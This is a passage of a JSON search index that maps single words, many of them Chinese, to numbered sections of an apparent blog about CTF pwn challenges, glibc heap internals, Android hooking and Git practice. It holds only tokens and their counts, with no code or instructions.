created\",{\"1\":{\"43\":2}}],[\"cdecl\",{\"1\":{\"255\":1}}],[\"cd\",{\"1\":{\"193\":2,\"248\":1}}],[\"cur\",{\"1\":{\"193\":1}}],[\"current\",{\"1\":{\"109\":1,\"175\":4,\"193\":4}}],[\"currentfocus\",{\"1\":{\"29\":1}}],[\"c00\",{\"1\":{\"150\":1,\"154\":1}}],[\"cycles\",{\"1\":{\"127\":1}}],[\"cs\",{\"1\":{\"220\":2,\"268\":3}}],[\"csize2tidx\",{\"1\":{\"109\":1,\"127\":1}}],[\"csdn博客获取程序寻找libc的顺序\",{\"1\":{\"237\":1}}],[\"csdn博客和man\",{\"1\":{\"237\":1}}],[\"csdn博客源码分析\",{\"1\":{\"92\":1}}],[\"csdn博客进行搭建pwn环境即可\",{\"1\":{\"47\":1}}],[\"csdn博客使用docker调试和部署pwn题\",{\"1\":{\"41\":1}}],[\"csdn博客可以知道可以通过添加<intent\",{\"1\":{\"38\":1}}],[\"csdn博客\",{\"1\":{\"36\":2,\"41\":1,\"43\":1,\"46\":1,\"47\":1,\"57\":1,\"62\":1,\"70\":1,\"111\":1,\"131\":4,\"167\":1}}],[\"csdn博客推荐下载书的网站\",{\"1\":{\"9\":1}}],[\"chr\",{\"1\":{\"260\":2}}],[\"cherry\",{\"1\":{\"252\":2}}],[\"check两大函数\",{\"1\":{\"212\":1}}],[\"check\",{\"1\":{\"90\":1,\"98\":1,\"100\":1,\"107\":1,\"109\":8,\"124\":3,\"127\":1,\"213\":1}}],[\"ch\",{\"1\":{\"179\":2,\"180\":2}}],[\"chain是指向的其他file\",{\"1\":{\"202\":1}}],[\"chain链接起来\",{\"1\":{\"202\":1}}],[\"chain链接\",{\"1\":{\"202\":1}}],[\"chain\",{\"1\":{\"188\":1,\"193\":1,\"202\":1}}],[\"change\",{\"1\":{\"182\":3,\"202\":1}}],[\"chance\",{\"1\":{\"109\":1,\"127\":1}}],[\"chars\",{\"1\":{\"249\":1}}],[\"characters\",{\"1\":{\"176\":1}}],[\"character\",{\"1\":{\"174\":1,\"175\":1,\"193\":1}}],[\"char\",{\"1\":{\"71\":1,\"77\":1,\"109\":2,\"138\":3,\"174\":1,\"182\":4,\"213\":2,\"216\":2,\"223\":1,\"224\":1,\"227\":1,\"244\":2,\"245\":2,\"246\":1,\"247\":1,\"254\":1,\"255\":2}}],[\"chunk时\",{\"1\":{\"276\":1}}],[\"chunk这样我们可以对这些原本的head\",{\"1\":{\"275\":1}}],[\"chunk触发合并机制\",{\"1\":{\"275\":1}}],[\"chunk记录的buf指针\",{\"1\":{\"275\":1}}],[\"chunk记录内容\",{\"1\":{\"274\":1}}],[\"chunk然后让ac触发合并机制\",{\"1\":{\"273\":1}}],[\"chunk然后再去寻找unsorted\",{\"1\":{\"143\":1}}],[\"chunk都是fd链中一条\",{\"1\":{\"225\":1}}],[\"chunk使用均值\",{\"1\":{\"223\":1}}],[\"chunk就可以任意修改buf指针完成任意free\",{\"1\":{\"275\":1}}],[\"chunk就可以实现任意free了\",{\"1\":{\"275\":1}}],[\"chunk就进入了tcache\",{\"1\":{\"269\":1}}],[\"chunk就是后续构造double\",{\"1\":{\"165\":1,\"287\":1}}],[\"chunk就合并\",{\"1\":{\"128\":1}}],[\"chunk了\",{\"1\":{\"160\":1,\"273\":1,\"282\":1}}],[\"chunk写入内容劫持head\",{\"1\":{\"160\":1,\"282\":1}}],[\"chunk进入fastbin链中\",{\"1\":{\"275\":1}}],[\"chunk进入unsortedbin\",{\"1\":{\"158\":1,\"280\":1}}],[\"chunk进行劫持\",{\"1\":{\"275\":1}}],[\"chunk进行的记录\",{\"1\":{\"275\":1}}],[\"chunk进行记录信息\",{\"1\":{\"274\":1}}],[\"chunk进行一个拖链操作\",{\"1\":{\"129\":1}}],[\"chunk成功\",{\"1\":{\"154\":1}}],[\"chunk往下0x550位置弄出一个\",{\"1\":{\"153\":1}}],[\"chunk大小为0x550所以我们要在fake\",{\"1\":{\"153\":1}}],[\"chunk6\",{\"1\":{\"150\":3}}],[\"chunk6都大的chunk这样就会去分割0x860chunk\",{\"1\":{\"150\":1,\"154\":1}}],[\"chunk0\",{\"1\":{\"150\":1}}],[\"chunk3\",{\"1\":{\"150\":3,\"152\":1,\"154\":1}}],[\"chunk有大小合适的\",{\"1\":{\"143\":1}}],[\"chunk前\",{\"1\":{\"143\":1}}],[\"chunk挡在top\",{\"1\":{\"143\":1}}],[\"chunk相邻会被直接合并\",{\"1\":{\"143\":1}}],[\"chunk相当于分配区的顶部空闲内存\",{\"1\":{\"132\":1}}],[\"chunk上分配\",{\"1\":{\"132\":1}}],[\"chunk而且这个free\",{\"1\":{\"130\":1}}],[\"chunk会被当做free\",{\"1\":{\"130\":1}}],[\"chunk里面\",{\"1\":{\"128\":1}}],[\"chunk则合并到top\",{\"1\":{\"128\":1}}],[\"chunk则直接合并\",{\"1\":{\"109\":1}}],[\"chunk2那么chunk2的fd指向chunk1就会变成\",{\"1\":{\"124\":1}}],[\"chunk2mem\",{\"1\":{\"90\":1,\"98\":1,\"100\":1,\"107\":1,\"109\":2,\"124\":1,\"127\":1,\"138\":1}}],[\"chunk出链\",{\"1\":{\"121\":1}}],[\"chunk中第二个chunk\",{\"1\":{\"276\":1}}],[\"chunk中第一页有这个结构体记录chunk的信息\",{\"1\":{\"223\":1}}],[\"chunk中找\",{\"1\":{\"115\":3}}],[\"chunk中申请\",{\"1\":{\"114\":1}}],[\"chunk实在不够才会去调用brk函数申请空间\",{\"1\":{\"114\":1}}],[\"chunk常见的就是携带fd\",{\"1\":{\"114\":1}}],[\"chunk结构\",{\"0\":{\"114\":1}}],[\"chunk入unsortedbin链\",{\"1\":{\"106\":1}}],[\"chunk入链\",{\"0\":{\"106\":1}}],[\"chunk脱链\",{\"0\":{\"106\":1}}],[\"chunk情况\",{\"0\":{\"98\":1}}],[\"chunks\",{\"1\":{\"95\":2,\"97\":2,\"98\":4,\"99\":2,\"106\":2,\"109\":6,\"132\":1,\"182\":1,\"223\":8}}],[\"chunksize链表中\",{\"1\":{\"93\":1}}],[\"chunksize\",{\"1\":{\"81\":1,\"95\":1,\"97\":3,\"104\":3,\"106\":4,\"109\":10,\"124\":3,\"129\":2,\"130\":1}}],[\"chunk最后一位开始遍历\",{\"1\":{\"95\":1}}],[\"chunkbck变量\",{\"1\":{\"95\":1}}],[\"chunk的时候会同步free\",{\"1\":{\"275\":1}}],[\"chunk的时候\",{\"1\":{\"143\":1}}],[\"chunk的链表数组\",{\"1\":{\"132\":1}}],[\"chunk的起始位置是根据prev\",{\"1\":{\"130\":1}}],[\"chunk的利用\",{\"1\":{\"130\":1}}],[\"chunk的mem\",{\"1\":{\"123\":1}}],[\"chunk的bk是一串随机的安全数\",{\"1\":{\"123\":1}}],[\"chunk的size进行限制\",{\"1\":{\"274\":1}}],[\"chunk的size\",{\"1\":{\"143\":1,\"144\":1}}],[\"chunk的size值\",{\"1\":{\"109\":1}}],[\"chunk的size检查\",{\"1\":{\"88\":1}}],[\"chunk的p值\",{\"1\":{\"97\":1}}],[\"chunk的prev\",{\"1\":{\"97\":1}}],[\"chunk的chunk\",{\"1\":{\"70\":1,\"122\":1}}],[\"chunk分析\",{\"0\":{\"78\":1}}],[\"chunk可以占用下一个chunk的prev\",{\"1\":{\"74\":1}}],[\"chunk一定是size\",{\"1\":{\"74\":1}}],[\"chunk\",{\"0\":{\"159\":1,\"275\":1,\"281\":1},\"1\":{\"69\":2,\"75\":1,\"81\":2,\"87\":1,\"90\":1,\"96\":1,\"97\":8,\"98\":4,\"100\":1,\"104\":1,\"106\":6,\"107\":1,\"109\":29,\"114\":4,\"115\":1,\"121\":1,\"124\":7,\"129\":2,\"130\":3,\"132\":2,\"138\":2,\"143\":17,\"144\":17,\"150\":2,\"151\":1,\"152\":1,\"153\":1,\"157\":1,\"161\":4,\"162\":2,\"165\":3,\"182\":2,\"223\":9,\"273\":9,\"276\":11,\"279\":1,\"283\":4,\"284\":2,\"287\":3,\"288\":8}}],[\"chop\",{\"1\":{\"249\":1}}],[\"choice\",{\"1\":{\"143\":1,\"144\":1}}],[\"chore构建过程或者辅助工具的变更\",{\"1\":{\"50\":1}}],[\"choose\",{\"1\":{\"21\":1}}],[\"choose函数\",{\"1\":{\"21\":1}}],[\"c2018\",{\"0\":{\"68\":1}}],[\"ctf还是学到了东西\",{\"1\":{\"268\":1}}],[\"ctf\",{\"1\":{\"46\":2,\"92\":2,\"254\":1}}],[\"cpu中pc寄存器初始值为0xffff0然后刚好指向rom\",{\"1\":{\"219\":1}}],[\"cpu开机后初始化指向bios\",{\"1\":{\"218\":1}}],[\"cp\",{\"1\":{\"43\":2,\"254\":1}}],[\"case\",{\"1\":{\"247\":4,\"249\":1}}],[\"cast\",{\"1\":{\"180\":1}}],[\"cause\",{\"1\":{\"195\":1}}],[\"cat命令\",{\"1\":{\"249\":1}}],[\"cat\",{\"1\":{\"248\":1,\"254\":1}}],[\"catomic\",{\"1\":{\"109\":1,\"124\":1,\"137\":2}}],[\"category属性\",{\"1\":{\"39\":1}}],[\"category\",{\"1\":{\"36\":1,\"39\":2}}],[\"cached\",{\"1\":{\"100\":1,\"223\":2}}],[\"cache\",{\"1\":{\"71\":1}}],[\"cannary\",{\"1\":{\"264\":6}}],[\"cannot\",{\"1\":{\"43\":2,\"92\":1,\"106\":1,\"109\":2}}],[\"canary\",{\"1\":{\"254\":1,\"288\":5}}],[\"can\",{\"1\":{\"109\":3,\"124\":1}}],[\"cancancel\",{\"1\":{\"65\":1}}],[\"cancel\",{\"1\":{\"65\":1}}],[\"call\",{\"1\":{\"182\":1,\"234\":1,\"255\":1,\"268\":1}}],[\"calloc\",{\"1\":{\"182\":2}}],[\"caller\",{\"1\":{\"138\":1}}],[\"called\",{\"1\":{\"30\":8,\"182\":1,\"195\":1}}],[\"callback\",{\"1\":{\"64\":2,\"65\":2}}],[\"callbacks\",{\"1\":{\"64\":4}}],[\"cnt\",{\"1\":{\"193\":1}}],[\"cnblogs\",{\"1\":{\"36\":1,\"39\":1,\"92\":2,\"235\":1,\"237\":1}}],[\"cn\",{\"1\":{\"36\":1,\"256\":1}}],[\"c\",{\"1\":{\"27\":1,\"58\":1,\"116\":1,\"132\":2,\"133\":1,\"153\":1,\"154\":1,\"247\":1,\"249\":2,\"264\":2,\"273\":1}}],[\"closed\",{\"1\":{\"202\":1}}],[\"close\",{\"1\":{\"180\":6,\"186\":2}}],[\"cleanup\",{\"1\":{\"171\":1}}],[\"clear\",{\"1\":{\"109\":2}}],[\"clz\",{\"1\":{\"27\":2}}],[\"clz=java\",{\"1\":{\"22\":1}}],[\"classes\",{\"1\":{\"22\":3}}],[\"classes=java\",{\"1\":{\"22\":1}}],[\"class\",{\"1\":{\"19\":1,\"20\":2,\"21\":1,\"22\":1,\"27\":2,\"30\":2,\"32\":1,\"64\":1,\"143\":1,\"144\":1}}],[\"classname\",{\"1\":{\"17\":1}}],[\"copy\",{\"1\":{\"268\":9}}],[\"copy过去执行\",{\"1\":{\"268\":1}}],[\"column\",{\"1\":{\"193\":1}}],[\"cores\",{\"1\":{\"137\":1}}],[\"cores+1\",{\"1\":{\"137\":2}}],[\"corresponding\",{\"1\":{\"109\":1}}],[\"corruption\",{\"1\":{\"109\":5,\"124\":1,\"163\":1,\"285\":1}}],[\"corrupted\",{\"1\":{\"81\":2,\"90\":1,\"97\":1,\"104\":2,\"106\":1,\"109\":1,\"110\":1,\"129\":3,\"130\":2}}],[\"coincidence\",{\"1\":{\"127\":2}}],[\"count+peak\",{\"1\":{\"223\":1}}],[\"count重新计算\",{\"1\":{\"223\":1}}],[\"counter\",{\"1\":{\"193\":2}}],[\"counted\",{\"1\":{\"71\":1}}],[\"count\",{\"1\":{\"100\":1,\"109\":1,\"127\":1,\"193\":4,\"223\":5}}],[\"counts\",{\"1\":{\"71\":2}}],[\"counts代表着每个bin当前所有的chunk数量\",{\"1\":{\"71\":1}}],[\"could\",{\"1\":{\"71\":1}}],[\"codecvt\",{\"1\":{\"174\":2,\"175\":2,\"193\":4}}],[\"code\",{\"0\":{\"54\":1,\"300\":1},\"1\":{\"75\":1,\"247\":2}}],[\"const\",{\"1\":{\"175\":1,\"180\":3,\"184\":1,\"193\":1,\"195\":1,\"213\":4,\"243\":1,\"255\":2}}],[\"consolidation\",{\"1\":{\"109\":3}}],[\"consolidated\",{\"1\":{\"109\":1}}],[\"consolidate\",{\"0\":{\"129\":1},\"1\":{\"109\":7}}],[\"console\",{\"1\":{\"17\":1,\"19\":2,\"21\":2,\"22\":3,\"23\":2,\"27\":3}}],[\"concurrent\",{\"1\":{\"109\":1,\"124\":1}}],[\"confident\",{\"1\":{\"43\":1}}],[\"configuration\",{\"1\":{\"0\":1}}],[\"control\",{\"1\":{\"249\":1}}],[\"contributing\",{\"0\":{\"7\":1}}],[\"contiguous\",{\"1\":{\"109\":3}}],[\"continue\",{\"1\":{\"100\":1}}],[\"context\",{\"1\":{\"154\":3,\"258\":3,\"260\":4,\"264\":3,\"265\":3,\"266\":3,\"267\":3,\"268\":3,\"269\":4,\"270\":2,\"271\":4,\"273\":4,\"276\":3,\"288\":3,\"289\":3,\"290\":3}}],[\"context=none\",{\"1\":{\"65\":1}}],[\"content是否为空去判断的\",{\"1\":{\"78\":1}}],[\"content是否为空去编辑的\",{\"1\":{\"78\":1}}],[\"content中写入内容\",{\"1\":{\"78\":1}}],[\"content被清空\",{\"1\":{\"78\":1}}],[\"content的时候malloc\",{\"1\":{\"78\":1}}],[\"content的内容\",{\"1\":{\"77\":1}}],[\"content\",{\"1\":{\"77\":1,\"143\":3,\"144\":3,\"154\":5,\"260\":3,\"273\":2,\"275\":1,\"276\":2,\"288\":2}}],[\"contain\",{\"1\":{\"132\":1}}],[\"contains\",{\"1\":{\"71\":1}}],[\"container\",{\"1\":{\"43\":4}}],[\"connect\",{\"1\":{\"43\":2}}],[\"connected\",{\"1\":{\"27\":1}}],[\"com文章中的脚本\",{\"1\":{\"182\":1}}],[\"competition\",{\"0\":{\"307\":1}}],[\"compromise\",{\"1\":{\"109\":1}}],[\"compare\",{\"1\":{\"109\":1,\"124\":1,\"137\":1}}],[\"complete\",{\"0\":{\"174\":1},\"1\":{\"106\":1,\"174\":1}}],[\"compiled\",{\"1\":{\"92\":1}}],[\"common\",{\"1\":{\"59\":1}}],[\"commit然后再merge进入master分支\",{\"1\":{\"60\":1}}],[\"commit分支的那个commit\",{\"1\":{\"60\":1}}],[\"commit产生的commit\",{\"1\":{\"59\":1}}],[\"commit\",{\"1\":{\"59\":6,\"60\":1,\"61\":1}}],[\"commit的内容\",{\"0\":{\"51\":1}}],[\"commit应该包含一个简明扼要的提交信息\",{\"1\":{\"49\":1}}],[\"command\",{\"1\":{\"43\":1,\"248\":3}}],[\"commands\",{\"1\":{\"27\":1}}],[\"com又是可以的\",{\"1\":{\"46\":1}}],[\"comdocker\",{\"1\":{\"41\":1}}],[\"com\",{\"1\":{\"1\":1,\"17\":1,\"19\":2,\"20\":1,\"21\":2,\"22\":2,\"26\":1,\"27\":4,\"28\":1,\"29\":1,\"30\":11,\"32\":1,\"36\":3,\"39\":2,\"46\":6,\"48\":2,\"57\":1,\"62\":1,\"80\":1,\"92\":2,\"116\":1,\"157\":2,\"167\":1,\"178\":1,\"234\":1,\"235\":1,\"237\":1,\"279\":2}}],[\"参考强网杯的shellcode第五届强网杯\",{\"1\":{\"268\":1}}],[\"参考文章\",{\"0\":{\"167\":1},\"1\":{\"39\":1,\"48\":1,\"92\":1,\"131\":1,\"222\":1,\"235\":1}}],[\"参考文章android之frida框架完全使用指南\",{\"1\":{\"9\":1}}],[\"参数\",{\"1\":{\"243\":1}}],[\"参加贡献的方式\",{\"0\":{\"7\":1}}],[\"ls\",{\"1\":{\"248\":1,\"265\":1}}],[\"ld当前绑定地址\",{\"1\":{\"240\":1}}],[\"ldd\",{\"1\":{\"240\":2}}],[\"ld的作用\",{\"1\":{\"239\":1}}],[\"ld\",{\"0\":{\"241\":1},\"1\":{\"237\":2,\"238\":1,\"241\":1,\"270\":1}}],[\"ljust\",{\"1\":{\"154\":2,\"258\":4,\"260\":2,\"264\":5,\"265\":2,\"266\":3,\"267\":3,\"268\":3,\"269\":2,\"271\":2,\"273\":2,\"276\":3,\"288\":4,\"289\":2,\"290\":3}}],[\"less\",{\"1\":{\"249\":6}}],[\"less命令\",{\"1\":{\"249\":1}}],[\"level=\",{\"1\":{\"154\":1,\"258\":1,\"260\":2,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":2,\"270\":1,\"271\":2,\"273\":2,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"len\",{\"1\":{\"143\":2,\"144\":2,\"268\":1,\"276\":1,\"288\":2,\"290\":1}}],[\"length\",{\"1\":{\"19\":3,\"22\":1,\"27\":1,\"213\":2,\"288\":3}}],[\"let\",{\"1\":{\"124\":1,\"138\":1,\"254\":1,\"256\":1}}],[\"lea\",{\"1\":{\"258\":1}}],[\"leave^key\",{\"1\":{\"288\":1}}],[\"leave\",{\"1\":{\"288\":3}}],[\"leave指令\",{\"1\":{\"231\":1}}],[\"leave|ret\",{\"1\":{\"230\":1}}],[\"leaver\",{\"1\":{\"23\":1}}],[\"leak\",{\"0\":{\"146\":1}}],[\"leak出来我们的libc地址\",{\"1\":{\"87\":1}}],[\"least\",{\"1\":{\"109\":1}}],[\"limit\",{\"1\":{\"137\":7}}],[\"lightweight\",{\"1\":{\"109\":1}}],[\"little\",{\"1\":{\"109\":1,\"254\":1,\"260\":1,\"269\":1,\"270\":1,\"271\":1,\"273\":1}}],[\"line=\",{\"1\":{\"252\":1}}],[\"lines=\",{\"1\":{\"249\":1}}],[\"lines\",{\"1\":{\"249\":1}}],[\"line\",{\"1\":{\"224\":4,\"226\":4,\"249\":1}}],[\"linux中常用的指令\",{\"0\":{\"249\":1}}],[\"linux程序加载简化流程\",{\"0\":{\"239\":1}}],[\"linux下程序的加载\",{\"1\":{\"237\":1}}],[\"linux动态链接库的加载顺序\",{\"1\":{\"237\":1}}],[\"linux源码趣读\",{\"1\":{\"217\":1}}],[\"linux源码阅读\",{\"0\":{\"217\":1}}],[\"linux\",{\"0\":{\"300\":1},\"1\":{\"154\":2,\"237\":1,\"241\":1,\"258\":2,\"260\":3,\"264\":2,\"265\":2,\"266\":2,\"267\":2,\"268\":1,\"269\":3,\"270\":2,\"271\":2,\"273\":3,\"276\":2,\"288\":2,\"289\":2,\"290\":2}}],[\"link\",{\"0\":{\"289\":1},\"1\":{\"109\":1,\"124\":1,\"188\":1,\"202\":3,\"234\":1,\"235\":1,\"289\":1}}],[\"linking\",{\"1\":{\"109\":2}}],[\"linked\",{\"1\":{\"71\":1,\"81\":1,\"90\":1,\"97\":1,\"104\":2,\"110\":1,\"129\":2,\"130\":1,\"132\":3,\"202\":2}}],[\"linc\",{\"1\":{\"42\":1}}],[\"list使用情况\",{\"1\":{\"276\":1}}],[\"list的利用详解\",{\"1\":{\"157\":1,\"279\":1}}],[\"list上的分配区结构\",{\"1\":{\"138\":1}}],[\"listen\",{\"1\":{\"64\":4}}],[\"list\",{\"1\":{\"30\":1,\"71\":1,\"81\":1,\"90\":1,\"97\":1,\"104\":2,\"106\":2,\"109\":1,\"110\":1,\"129\":2,\"130\":1,\"132\":6,\"134\":7,\"137\":1,\"138\":13,\"162\":2,\"169\":1,\"174\":1,\"188\":4,\"193\":1,\"195\":1,\"202\":4,\"207\":1,\"223\":2,\"276\":5,\"284\":2,\"288\":4}}],[\"lib中寻找\",{\"1\":{\"238\":1}}],[\"lib寻找\",{\"1\":{\"238\":1}}],[\"libray\",{\"1\":{\"238\":1}}],[\"library\",{\"1\":{\"238\":1}}],[\"libraries里面开新的空间\",{\"1\":{\"112\":1}}],[\"libary\",{\"1\":{\"238\":3}}],[\"libio\",{\"1\":{\"180\":3}}],[\"libc+0x35732\",{\"1\":{\"288\":1}}],[\"libc+0x2be51\",{\"1\":{\"288\":1}}],[\"libc+0x2a3e5\",{\"1\":{\"288\":1}}],[\"libc+0x133bea\",{\"1\":{\"288\":1}}],[\"libc+0x119170\",{\"1\":{\"288\":1}}],[\"libc+0x11f2e7\",{\"1\":{\"288\":1}}],[\"libc+0x1147d0\",{\"1\":{\"288\":1}}],[\"libc+0x1144e0\",{\"1\":{\"288\":1}}],[\"libc+0x114870\",{\"1\":{\"288\":1}}],[\"libc+0x1ecb70\",{\"1\":{\"273\":1}}],[\"libc就是ldd查到的那个ld地址\",{\"1\":{\"241\":1}}],[\"libc2\",{\"0\":{\"212\":1,\"214\":1}}],[\"libc地址\",{\"1\":{\"168\":1}}],[\"libc的操作\",{\"1\":{\"146\":1}}],[\"libc操作复现\",{\"0\":{\"146\":1}}],[\"libc版本2\",{\"1\":{\"140\":1,\"146\":1}}],[\"libc都没实现\",{\"1\":{\"84\":1}}],[\"libc基地址0x7f566bb4f000=偏移0x3ac78\",{\"1\":{\"72\":1}}],[\"libc\",{\"0\":{\"208\":1,\"241\":1},\"1\":{\"42\":3,\"109\":4,\"127\":1,\"132\":1,\"134\":5,\"135\":1,\"136\":5,\"138\":7,\"154\":4,\"158\":1,\"165\":4,\"182\":5,\"207\":1,\"208\":1,\"213\":6,\"241\":4,\"258\":2,\"260\":5,\"264\":8,\"273\":10,\"276\":4,\"280\":1,\"287\":4,\"288\":13}}],[\"libcbaseaddr\",{\"1\":{\"23\":1}}],[\"lib\",{\"1\":{\"23\":1,\"241\":1}}],[\"libnative\",{\"1\":{\"23\":1}}],[\"license\",{\"0\":{\"8\":1}}],[\"la13x\",{\"1\":{\"183\":1}}],[\"lambda\",{\"1\":{\"154\":11,\"258\":11,\"260\":11,\"264\":11,\"265\":11,\"266\":11,\"267\":11,\"268\":11,\"269\":11,\"271\":11,\"273\":11,\"276\":11,\"288\":11,\"289\":11,\"290\":11}}],[\"larger\",{\"1\":{\"137\":1}}],[\"largechunk中最大的chunk还是小于我们所需求的chunk大小这种情况\",{\"1\":{\"110\":1}}],[\"large最终入bin操作\",{\"0\":{\"102\":1}}],[\"largebin等\",{\"1\":{\"132\":1}}],[\"largebin第一个chunk和头的互锁状态\",{\"1\":{\"106\":1}}],[\"largebin中有chunk\",{\"1\":{\"106\":1}}],[\"largebin情况\",{\"1\":{\"105\":1}}],[\"largebin还有chunk\",{\"1\":{\"102\":1}}],[\"largebin\",{\"0\":{\"93\":1,\"104\":1},\"1\":{\"93\":1,\"104\":3,\"110\":1}}],[\"large\",{\"0\":{\"92\":1},\"1\":{\"92\":1,\"93\":1,\"109\":2,\"137\":1,\"138\":2,\"223\":2}}],[\"last\",{\"1\":{\"90\":1,\"106\":1,\"132\":1,\"175\":1,\"193\":2}}],[\"launcher主要和action中的android\",{\"1\":{\"39\":1}}],[\"lang\",{\"1\":{\"21\":1,\"30\":3}}],[\"layout\",{\"1\":{\"0\":2}}],[\"lockp函数的利用\",{\"1\":{\"206\":1}}],[\"lockp\",{\"0\":{\"208\":1},\"1\":{\"169\":1}}],[\"locked\",{\"1\":{\"124\":3,\"188\":3,\"192\":3}}],[\"lock\",{\"1\":{\"109\":16,\"124\":8,\"132\":3,\"134\":12,\"136\":5,\"138\":16,\"188\":3,\"192\":2,\"193\":3,\"202\":1}}],[\"local\",{\"1\":{\"27\":1,\"154\":2}}],[\"location\",{\"1\":{\"27\":1}}],[\"long\",{\"1\":{\"98\":2,\"104\":5,\"106\":4,\"109\":6,\"138\":2,\"189\":6,\"249\":3}}],[\"lore学习\",{\"0\":{\"89\":1}}],[\"low\",{\"1\":{\"71\":1}}],[\"loop\",{\"1\":{\"64\":1,\"268\":4}}],[\"loss\",{\"1\":{\"46\":1}}],[\"logger\",{\"1\":{\"21\":1}}],[\"log\",{\"1\":{\"17\":1,\"19\":2,\"21\":3,\"22\":3,\"23\":2,\"27\":3,\"154\":1,\"258\":1,\"260\":2,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":2,\"270\":1,\"271\":2,\"273\":2,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"load\",{\"1\":{\"14\":1,\"109\":1}}],[\"l\",{\"1\":{\"14\":1,\"27\":2,\"193\":1,\"270\":1}}],[\"背景和动机是什么\",{\"1\":{\"3\":1}}],[\"介绍为什么要做这个项目\",{\"1\":{\"3\":1}}],[\"必备的信息\",{\"0\":{\"2\":1}}],[\"p=\",{\"1\":{\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"270\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"peak\",{\"1\":{\"223\":2,\"224\":2,\"226\":2}}],[\"perturb\",{\"1\":{\"90\":1,\"98\":1,\"100\":1,\"107\":1,\"109\":2,\"124\":1}}],[\"perthread\",{\"1\":{\"71\":5,\"123\":1}}],[\"per\",{\"1\":{\"71\":1}}],[\"performed\",{\"1\":{\"109\":1}}],[\"performance\",{\"1\":{\"71\":1,\"109\":1}}],[\"perform\",{\"1\":{\"16\":1,\"17\":1,\"27\":1,\"106\":1}}],[\"php扩展学习\",{\"0\":{\"222\":1}}],[\"php7内核剖析\",{\"1\":{\"221\":1,\"222\":1}}],[\"php堆开发简介\",{\"1\":{\"221\":1}}],[\"php\",{\"0\":{\"221\":1,\"301\":1},\"1\":{\"222\":2}}],[\"p2\",{\"1\":{\"182\":4}}],[\"p1\",{\"1\":{\"182\":5}}],[\"p16\",{\"1\":{\"150\":1,\"154\":1}}],[\"pbackfail\",{\"1\":{\"180\":9,\"186\":2}}],[\"p64\",{\"1\":{\"143\":10,\"144\":10,\"152\":1,\"153\":1,\"154\":2,\"162\":5,\"163\":2,\"165\":2,\"258\":7,\"260\":6,\"265\":1,\"266\":1,\"273\":1,\"276\":1,\"284\":5,\"285\":2,\"287\":2,\"288\":16,\"289\":6,\"290\":3}}],[\"pthreads\",{\"1\":{\"243\":1}}],[\"pthread\",{\"1\":{\"243\":11,\"244\":9,\"245\":1}}],[\"ptmp的做题记录\",{\"0\":{\"155\":1}}],[\"ptmalloc2\",{\"0\":{\"274\":1,\"277\":1,\"288\":1}}],[\"ptmalloc中用主分配区和非主分配区用来解决线程争夺问题\",{\"1\":{\"132\":1}}],[\"ptmalloc通过malloc\",{\"1\":{\"132\":1}}],[\"ptmalloc源码分析\",{\"1\":{\"131\":3}}],[\"ptmalloc主arena存在的意义\",{\"1\":{\"131\":1}}],[\"ptmalloc堆概述\",{\"1\":{\"131\":1}}],[\"ptmalloc\",{\"0\":{\"131\":1}}],[\"ptr会逐渐增加\",{\"1\":{\"211\":1}}],[\"ptr=\",{\"1\":{\"189\":1}}],[\"ptr的值设置成mstate的分配区状态机的数据结构\",{\"1\":{\"138\":1}}],[\"ptr\",{\"1\":{\"23\":2,\"109\":2,\"136\":13,\"138\":7,\"143\":4,\"144\":4,\"163\":1,\"175\":2,\"182\":1,\"189\":4,\"193\":6,\"195\":2,\"211\":4,\"213\":2,\"224\":3,\"227\":3,\"285\":1}}],[\"p入unsortedbin链\",{\"1\":{\"109\":1}}],[\"p位置\",{\"1\":{\"109\":1}}],[\"plt>\",{\"1\":{\"255\":1}}],[\"plt存我们需要\",{\"1\":{\"236\":1}}],[\"plt这个数组的下标\",{\"1\":{\"236\":1}}],[\"plt这里\",{\"1\":{\"231\":1}}],[\"plt\",{\"1\":{\"231\":1,\"234\":3,\"236\":4,\"255\":1}}],[\"plus入链\",{\"1\":{\"188\":1}}],[\"plus结构体链接到\",{\"1\":{\"188\":1}}],[\"plus结构体数据\",{\"1\":{\"188\":1}}],[\"plus结构体与这些相关函数的联系\",{\"1\":{\"187\":1}}],[\"plus结构体的第一个属性file就是存储这个文件流的\",{\"1\":{\"185\":1}}],[\"plus结构体部分\",{\"1\":{\"182\":1}}],[\"plus\",{\"0\":{\"288\":1},\"1\":{\"179\":1,\"184\":1,\"188\":1,\"192\":1,\"202\":2}}],[\"placed\",{\"1\":{\"109\":1}}],[\"place\",{\"1\":{\"109\":3}}],[\"please\",{\"1\":{\"0\":1,\"260\":4,\"266\":2,\"273\":4,\"276\":1,\"288\":2}}],[\"p为0\",{\"1\":{\"106\":1}}],[\"python中的asyncio使用详解\",{\"1\":{\"62\":1}}],[\"python\",{\"0\":{\"62\":1,\"296\":1},\"1\":{\"62\":2}}],[\"png\",{\"1\":{\"58\":1}}],[\"prefix\",{\"1\":{\"270\":1}}],[\"predictable\",{\"1\":{\"195\":1}}],[\"present\",{\"1\":{\"138\":1}}],[\"previous\",{\"1\":{\"109\":1,\"138\":3}}],[\"prevsize\",{\"1\":{\"109\":4}}],[\"prev\",{\"1\":{\"75\":1,\"81\":2,\"96\":1,\"97\":3,\"98\":2,\"106\":2,\"109\":6,\"114\":2,\"129\":2,\"130\":4,\"138\":1,\"143\":6,\"144\":6,\"162\":2,\"223\":1,\"273\":1,\"276\":2,\"284\":2}}],[\"prctl\",{\"1\":{\"118\":1}}],[\"pro\",{\"0\":{\"277\":1}}],[\"prompt\",{\"1\":{\"249\":2}}],[\"promise\",{\"1\":{\"63\":1}}],[\"proversion\",{\"1\":{\"248\":1}}],[\"provided\",{\"1\":{\"176\":1}}],[\"protect\",{\"1\":{\"163\":1,\"285\":1}}],[\"proper\",{\"1\":{\"138\":1}}],[\"proposed\",{\"1\":{\"46\":1}}],[\"probe\",{\"1\":{\"127\":1,\"136\":1,\"138\":1}}],[\"process\",{\"1\":{\"64\":2,\"143\":1,\"144\":1,\"213\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"270\":2,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"pr\",